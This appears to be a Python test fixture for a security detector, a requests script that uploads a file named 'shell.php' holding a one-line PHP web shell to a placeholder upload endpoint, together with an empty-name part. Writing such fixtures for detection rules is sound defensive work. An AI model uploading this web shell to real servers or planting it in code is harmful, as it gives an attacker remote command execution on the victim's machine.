# Technique fixture: a requests multipart client whose files list pairs an
# empty-name tuple with a server-script filename. Must fire the
# client-empty-part-script-upload composite (suspicious). Deliberately
# product-agnostic: no CMS endpoint, so no hostile product composite fires.
import requests

UPLOAD_URL = "http://target/upload.php"

files = [
    ("file", ("", b"empty", "application/octet-stream")),
    ("file", ("shell.php", b'<?php system($_GET["c"]); ?>', "application/x-php")),
]

response = requests.post(UPLOAD_URL, files=files)
print(response.status_code)
